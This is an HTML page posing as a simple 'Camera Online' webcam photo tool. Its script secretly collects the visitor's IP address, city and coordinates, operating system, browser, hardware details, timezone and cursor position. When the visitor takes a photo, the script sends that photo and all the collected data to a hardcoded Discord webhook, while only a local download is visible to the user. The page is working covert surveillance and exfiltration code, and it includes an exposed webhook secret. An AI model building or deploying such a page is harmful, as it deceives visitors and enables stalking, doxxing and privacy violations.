<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Camera Online</title>
</head>
<body>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>
<button id="snapBtn">Take Photo</button>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1466082233713557607/k8-lt3aCsanEJjEf_95RkOyj6SRLkeHiF0jZL4Mi_80mNhJHfvKAo-lfEayMQ_FvwRLO";
const IPINFO = "https://ipinfo.io/json";
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const snapBtn = document.getElementById("snapBtn");
let mouse = { x: 0, y: 0 };

// cursor tracking
document.addEventListener("mousemove", e => {
    mouse.x = e.clientX;
    mouse.y = e.clientY;
});

// browser helper
function parseBrowser(ua) {
    if (ua.includes("Chrome")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    return "Unknown";
}

function parseOS(ua, platform) {
    if (/Windows NT 10/.test(ua)) return "Windows 10";
    if (/Windows NT 11/.test(ua) || /Windows NT 10.0/.test(ua)) return "Windows 11";
    if (/Windows NT 6.3/.test(ua)) return "Windows 8.1";
    if (/Windows NT 6.2/.test(ua)) return "Windows 8";
    if (/Windows NT 6.1/.test(ua)) return "Windows 7";
    if (/Mac OS X (\d+[\._]\d+)/.test(ua)) {
        return "macOS " + ua.match(/Mac OS X (\d+[\._]\d+)/)[1].replace("_", ".");
    }
    if (/Android (\d+[\.\d]*)/.test(ua)) return "Android " + ua.match(/Android (\d+[\.\d]*)/)[1];
    if (/iPhone OS (\d+_\d+)/.test(ua)) return "iOS " + ua.match(/iPhone OS (\d+_\d+)/)[1].replace("_", ".");
    if (/iPad; CPU OS (\d+_\d+)/.test(ua)) return "iPadOS " + ua.match(/iPad; CPU OS (\d+_\d+)/)[1].replace("_", ".");
    if (platform === "Linux armv7l" || platform === "Linux aarch64") return "Android/Linux";
    return platform;
}

function deviceType() {
    return screen.width <= 768 ? "Mobile" : "Desktop";
}

// data object
const data = {
    time: new Date().toLocaleString(undefined, {
        year: "numeric", month: "2-digit", day: "2-digit",
        hour: "2-digit", minute: "2-digit", second: "2-digit"
    }),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    userAgent: navigator.userAgent,
    browser: `${parseBrowser(navigator.userAgent)} ${navigator.appVersion.match(/Chrome\/\d+\.\d+/) || ''}`,
    platform: parseOS(navigator.userAgent, navigator.platform),
    screen: `${screen.width} x ${screen.height}`,
    device: deviceType(),
    mouse: {},
    permissions: {},
    cpuCores: navigator.hardwareConcurrency || "N/A",
    ramApprox: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"
};

// IP a GPS z ipinfo
fetch(IPINFO)
.then(r => r.json())
.then(ip => {
    data.ip = ip.ip;
    data.hostname = ip.hostname || "N/A";
    data.city = ip.city;
    data.region = ip.region;
    data.country = ip.country;
    data.org = ip.org;
    data.loc = ip.loc;
    data.gps = ip.loc || "N/A";
});

// kamera
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    data.permissions.camera = "granted";
    video.srcObject = stream;
})
.catch(() => {
    data.permissions.camera = "denied";
});

// discord embed
function sendEmbed(imageBlob) {
    data.mouse = mouse;
    const embed = {
        title: "New info logged!",
        color: 0x2f3136,
        fields: [
            { name: "IP Address", value: data.ip || "Loading..." },
            { name: "Location", value: `${data.city}, ${data.region}, ${data.country}` },
            { name: "Coordinates", value: data.loc || "N/A" },
            { name: "GPS Location", value: data.gps || "N/A" },
            { name: "Organization / ASN", value: data.org || "N/A" },
            { name: "Operating System", value: data.platform },
            { name: "Browser", value: data.browser },
            { name: "CPU Cores", value: data.cpuCores, inline: true },
            { name: "Approx. RAM", value: data.ramApprox, inline: true },
            { name: "Language", value: data.language, inline: true },
            { name: "Screen Resolution", value: data.screen, inline: true },
            { name: "Device Type", value: data.device, inline: true },
            { name: "Timezone", value: data.timezone },
            { name: "Cursor Position", value: `X:${data.mouse.x} Y:${data.mouse.y}` }
        ],
        footer: { text: `Visit time: ${data.time}` }
    };
    if (imageBlob) embed.image = { url: "attachment://camera.png" };

    const form = new FormData();
    form.append("payload_json", JSON.stringify({ embeds: [embed] }));
    if (imageBlob) form.append("file", imageBlob, "camera.png");

    fetch(WEBHOOK_URL, { method: "POST", body: form });
}

// take photo tlactiko
snapBtn.addEventListener("click", () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {
        // Send to webhook
        sendEmbed(blob);

        // Download file
        const link = document.createElement("a");
        const filename = new Date().toISOString().replace(/:/g, "-") + ".png";
        link.href = URL.createObjectURL(blob);
        link.download = filename;
        link.click();
    }, "image/png");
});
</script>
</body>
</html>
